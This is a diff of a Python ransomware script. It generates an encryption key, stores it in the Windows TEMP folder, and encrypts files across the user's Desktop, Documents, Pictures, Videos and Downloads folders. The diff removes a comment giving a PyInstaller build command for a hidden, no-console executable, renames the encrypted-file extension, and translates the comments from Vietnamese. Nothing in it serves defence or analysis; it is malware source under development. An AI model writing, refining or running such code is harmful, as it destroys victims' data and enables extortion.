@@ -1,12 +1,8 @@
-# Always encryption %userprofile%/Desktop, %userprofile%/Documents, %userprofile%/Pictures, %userprofile%/Videos, %userprofile%/Downloads
-# No console update v1.0.2+
-# pyinstaller --onefile --icon=NONE --noconsole abc_ransomware_decrypt_v0_1_2_noconsole_update.py
-
 import time, os, psutil, sys
 from cryptography.fernet import Fernet
 
 def encrypt_file(file_path, key):
-    if not os.path.isfile(file_path) or file_path.endswith('.crypt000as21p'):
+    if not os.path.isfile(file_path) or file_path.endswith('.abc'):
         return
         
     try:
@@ -24,12 +20,12 @@ def encrypt_file(file_path, key):
         print
 
 def main():
-    # 1. Tạo khóa mã hóa
+    # 1. Create key file
     key = Fernet.generate_key()
     key_string = key.decode()
     
-    # 2. Lấy đường dẫn thư mục %temp% và định nghĩa file lưu key
-    # os.environ.get('TEMP') sẽ trả về đường dẫn dạng C:\Users\Tên_User\AppData\Local\Temp
+    # 2. Get direct is TEMP and save key
+    # os.environ.get('TEMP') result direct C:\Users\Tên_User\AppData\Local\Temp
     temp_dir = os.environ.get('TEMP')
     key_file_path = os.path.join(temp_dir, "key_abc001.txt")
     
@@ -40,7 +36,7 @@ def main():
     except Exception as e:
         print
     
-    # 3. Lấy đường dẫn thư mục user hiện tại (%userprofile%) để mã hóa
+    # 3. Encrypt users's files
     user_profile = os.path.expanduser("~")
     target_paths = [
         os.path.join(user_profile, "Desktop"),
@@ -50,7 +46,6 @@ def main():
         os.path.join(user_profile, "Downloads")
     ]
     
-    # Duyệt qua từng thư mục trong danh sách để mã hóa
     for path in target_paths:
         print(f"\nStart scan folders: {path}")
         if os.path.isdir(path):
